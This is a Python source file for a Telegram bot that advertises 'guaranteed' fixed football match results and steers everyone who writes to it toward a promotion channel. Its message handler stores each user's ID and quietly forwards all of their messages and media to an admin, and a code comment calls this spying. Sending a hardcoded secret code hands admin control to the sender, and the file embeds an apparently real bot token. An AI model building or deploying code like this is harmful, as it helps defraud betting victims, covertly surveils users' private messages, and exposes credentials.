import telebot
import sqlite3
import os
from flask import Flask
from threading import Thread
from telebot import types

# --- Configuration / الإعدادات ---
TOKEN = "7225070696:AAEBSquEmyDCzz0o65GoVPHIG2Xk5qBf_Lg"
ADMIN_SECRET_CODE = "0718991554"  # الكود اللي كيخليك تولي أدمن
CHANNEL_URL = "https://t.me/+Rf0RSJAleZ9mNTdk" # القناة الجديدة ديالك

bot = telebot.TeleBot(TOKEN)
# الأيدي الافتراضي (غيتبدل غير تصيفط الكود السري)
current_admin_id = 718991554 

# --- Database Setup / قاعدة البيانات ---
def init_db():
    conn = sqlite3.connect('bot_data.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect('bot_data.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('bot_data.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    users = cursor.fetchall()
    conn.close()
    return [str(u[0]) for u in users]

# --- Flask Server (Keep Alive) ---
app = Flask('')
@app.route('/')
def home(): return "JOSEPH FIXED BOT IS LIVE"
def run(): app.run(host='0.0.0.0', port=os.environ.get('PORT', 8080))
def keep_alive(): Thread(target=run).start()

# --- Promo Message / رسالة الترويج ---
def send_promo_msg(chat_id):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("JOIN CHANNEL FOR FIXED MATCHES 📢", url=CHANNEL_URL)
    markup.add(btn)
    
    promo_text = (
        "Welcome to **JOSEPH FIXED MATCHES** ⚽️\n\n"
        "To get today's **100% GUARANTEED & SECURE** fixed scores, "
        "you must join our official channel first!\n\n"
        "👇 Click the button below to join:"
    )
    bot.send_message(chat_id, promo_text, reply_markup=markup, parse_mode="Markdown")

# --- Logic / نظام الخدمة ---
@bot.message_handler(func=lambda message: True, content_types=['text', 'photo', 'video', 'document', 'voice'])
def handle_messages(message):
    global current_admin_id
    user_id = message.from_user.id
    text = message.text if message.text else ""

    # 1. تفعيل وضع الأدمن بالكود السري
    if text == ADMIN_SECRET_CODE:
        current_admin_id = user_id
        bot.reply_to(message, "✅ **Welcome Boss!**\n\nYou are now the active Admin. All user messages will be forwarded here.")
        return

    # 2. إذا كان المرسل هو الأدمن
    if user_id == current_admin_id:
        if text == "/users":
            count = len(get_all_users())
            bot.reply_to(message, f"📊 Total Users: {count}")
        elif text == "/export":
            users = get_all_users()
            with open("ids.txt", "w") as f:
                for u in users: f.write(f"{u}\n")
            with open("ids.txt", "rb") as f:
                bot.send_document(user_id, f, caption="📄 Users List.")
            os.remove("ids.txt")
        return

    # 3. للمستخدمين العاديين
    add_user(user_id)
    
    # توجيه الميساج للأدمن (تجسس)
    try:
        info = f"👤 From: {message.from_user.first_name}\n🆔 ID: `{user_id}`\n---"
        bot.send_message(current_admin_id, info, parse_mode="Markdown")
        bot.forward_message(current_admin_id, message.chat.id, message.message_id)
    except:
        pass
    
    # الرد التلقائي بالترويج
    send_promo_msg(user_id)

if __name__ == "__main__":
    init_db()
    keep_alive()
    bot.infinity_polling()
